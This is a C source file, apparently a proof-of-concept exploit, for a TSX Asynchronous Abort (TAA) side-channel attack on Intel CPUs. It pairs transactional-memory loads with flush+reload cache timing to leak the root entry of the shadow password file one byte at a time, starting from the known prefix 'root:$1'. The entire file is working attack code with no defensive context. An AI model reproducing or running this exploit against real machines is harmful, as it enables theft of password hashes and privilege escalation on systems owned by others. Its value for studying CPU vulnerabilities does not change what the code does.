#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <immintrin.h>

#include "util.h"

// Configuration
#define EXPONENT 12
#define STRIDE (1 << EXPONENT)  // 4096
#define N_CHARS 256
#define RELOADBUFFER_SIZE (N_CHARS * STRIDE)

#define START_CHAR 0x20  // space
#define END_CHAR 0x7E    // ~

#define CACHE_THRESHOLD 150
#define KNOWN_PREFIX "root:$1"
#define KNOWN_PREFIX_LEN 7

#define MAX_SECRET_LEN 64
#define ITERATIONS_PER_BATCH 100
#define RELOAD_SIGNAL_THRESHOLD 10  // Exit early if we get this many hits

// Global buffers
unsigned char *reloadbuffer;
unsigned char *leakbuffer;
uint32_t *cache_hits;
char leaked_secret[MAX_SECRET_LEN + 1];

// Initialize buffers
void init_buffers() {
    // Allocate reload buffer
    reloadbuffer = mmap(NULL, RELOADBUFFER_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (reloadbuffer == MAP_FAILED) {
        perror("mmap reloadbuffer");
        exit(1);
    }
    memset(reloadbuffer, 0, RELOADBUFFER_SIZE);

    // Allocate leak buffer
    leakbuffer = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (leakbuffer == MAP_FAILED) {
        perror("mmap leakbuffer");
        exit(1);
    }

    // Allocate cache hits counter
    cache_hits = calloc(N_CHARS, sizeof(uint32_t));
    if (!cache_hits) {
        perror("malloc cache_hits");
        exit(1);
    }
}

// Flush reload buffer
void flush_buffer() {
    for (int i = START_CHAR; i <= END_CHAR; i++) {
        clflush(reloadbuffer + i * STRIDE);
    }
}

// Reload buffer and count cache hits
void reload_buffer() {
    for (int i = 0; i < 256; i++) {
        int index = ((i * 7) + 13) & 255;  // Random access pattern
        if (index >= START_CHAR && index <= END_CHAR) {
            uint64_t time = time_flush_reload(reloadbuffer + index * STRIDE);
            if (time < CACHE_THRESHOLD) {
                cache_hits[index]++;
            }
        }
    }
}

// Find character with most hits
uint8_t get_max_hits(uint32_t *max_count) {
    uint32_t max = 0;
    uint8_t best_char = 0;
    
    for (int i = START_CHAR; i <= END_CHAR; i++) {
        if (cache_hits[i] > max) {
            max = cache_hits[i];
            best_char = i;
        }
    }
    
    *max_count = max;
    return best_char;
}

// Simple TAA leak with known prefix masking
static inline __attribute__((always_inline)) 
void taa_leak(void *leak_addr, uint64_t known_prefix) {
    asm volatile(
        "clflush (%0)\n"
        "sfence\n"
        "clflush (%1)\n"
        
        "xbegin 1f\n"
        "movq (%0), %%rax\n"           // Load 8 bytes
        "xorq %3, %%rax\n"             // XOR with known prefix (zeros out known bytes)
        "rol %%cl, %%rax\n"            // Rotate to position unknown byte
        "movzbq (%%rax, %1), %%rax\n"  // Access reloadbuffer
        "xend\n"
        "1:\n"
        :
        : "r"(leak_addr), "r"(reloadbuffer), "c"(EXPONENT + 8), "r"(known_prefix)
        : "rax"
    );
}

// Leak one byte at position 'index'
char leak_byte_at_index(int index) {
    // Reset cache hits
    memset(cache_hits, 0, N_CHARS * sizeof(uint32_t));
    
    // Build known prefix (7 bytes before current index)
    uint64_t known_prefix = *((uint64_t *)&leaked_secret[index - 7]) & 0x00ffffffffffffff;
    
    uint32_t iteration = 0;
    uint32_t max_hits = 0;
    uint8_t best_char = 0;
    
    while (1) {
        // Flush + Leak + Reload cycle
        flush_buffer();
        
        for (int i = 0; i < ITERATIONS_PER_BATCH; i++) {
            taa_leak(leakbuffer + (index - 7), known_prefix);
        }
        mfence();
        
        reload_buffer();
        
        // Check for early exit every 3000 iterations
        if (iteration % 3000 == 0) {
            best_char = get_max_hits(&max_hits);
            
            if (max_hits >= RELOAD_SIGNAL_THRESHOLD) {
                printf("[iter %d] Found: '%c' (0x%02x) with %d hits\n", 
                       iteration, best_char, best_char, max_hits);
                return best_char;
            }
        }
        
        iteration++;
        
        // Safety: don't loop forever
        if (iteration > 100000) {
            printf("[WARNING] Max iterations reached, best guess: '%c' (%d hits)\n", 
                   best_char, max_hits);
            return best_char;
        }
    }
}

int main(int argc, char* argv[]) {
    printf("############################################################\n");
    printf("Simple TAA Shadow File Leak\n");
    printf("############################################################\n\n");
    
    // Initialize
    init_buffers();
    memcpy(leaked_secret, KNOWN_PREFIX, strlen(KNOWN_PREFIX));
    
    printf("Starting with: %s\n\n", leaked_secret);
    
    // Leak bytes one by one
    int index = strlen(KNOWN_PREFIX);
    int colon_count = 1;  // Already have one ':' in "root:"
    
    while (index < MAX_SECRET_LEN && colon_count < 8) {
        char leaked_char = leak_byte_at_index(index);
        
        leaked_secret[index] = leaked_char;
        leaked_secret[index + 1] = '\0';
        
        printf("Current: %s\n\n", leaked_secret);
        
        if (leaked_char == ':') {
            colon_count++;
        }
        
        index++;
    }
    
    printf("\n############################################################\n");
    printf("Final result: %s\n", leaked_secret);
    printf("############################################################\n");
    
    // Cleanup
    munmap(reloadbuffer, RELOADBUFFER_SIZE);
    munmap(leakbuffer, 0x1000);
    free(cache_hits);
    
    return 0;
}